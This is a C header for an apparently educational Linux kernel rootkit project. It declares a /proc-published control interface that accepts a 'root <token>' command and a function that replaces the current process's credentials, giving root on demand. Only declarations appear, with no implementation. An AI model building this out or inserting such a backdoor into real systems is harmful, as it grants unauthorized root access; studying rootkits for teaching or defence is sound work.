// SPDX-License-Identifier: GPL-2.0
#ifndef ROOTKITLINGS_ROOTKIT_H
#define ROOTKITLINGS_ROOTKIT_H

#include <linux/compiler_attributes.h>
#include <linux/types.h>

#define RK_AUTHORIZATION_TOKEN_BYTES 16U
#define RK_AUTHORIZATION_TOKEN_HEX_LENGTH \
	(RK_AUTHORIZATION_TOKEN_BYTES * 2U)
#define RK_AUTHORIZATION_TOKEN_TEXT_CAPACITY \
	(RK_AUTHORIZATION_TOKEN_HEX_LENGTH + 1U)
#define RK_ROOT_COMMAND_PREFIX "root "
#define RK_ROOT_COMMAND_LENGTH \
	((sizeof(RK_ROOT_COMMAND_PREFIX) - 1U) + \
	 RK_AUTHORIZATION_TOKEN_HEX_LENGTH)
#define RK_CONTROL_COMMAND_CAPACITY (RK_ROOT_COMMAND_LENGTH + 1U)

enum rk_fail_point {
	RK_FAIL_NONE = 0,
	RK_FAIL_PREFLIGHT = 1,
	RK_FAIL_STATE_ALLOC = 2,
	RK_FAIL_PROC_PUBLISH = 3,
	RK_FAIL_CREDENTIAL_PREPARE = 4,
	RK_FAIL_CREDENTIAL_CANCEL = 5,
};

struct rk_state;

__must_check struct rk_state *rk_state_create(void);
bool rk_state_is_active(const struct rk_state *state);
bool rk_state_actions_enabled(const struct rk_state *state);
void rk_state_set_actions_enabled(struct rk_state *state, bool enabled);
void rk_state_destroy(struct rk_state *state);

__must_check int rk_authorization_start(void);
void rk_authorization_stop(void);
void rk_authorization_snapshot(const struct rk_state *state,
			       bool *actions_enabled,
			       unsigned long *completed_actions,
			       char token[RK_AUTHORIZATION_TOKEN_TEXT_CAPACITY]);
__must_check int rk_authorization_execute(struct rk_state *state,
					  const char *command,
					  size_t length);

__must_check int rk_proc_publish(struct rk_state *state);
void rk_proc_unpublish(void);

__must_check int rk_credentials_replace_current(void);

#endif
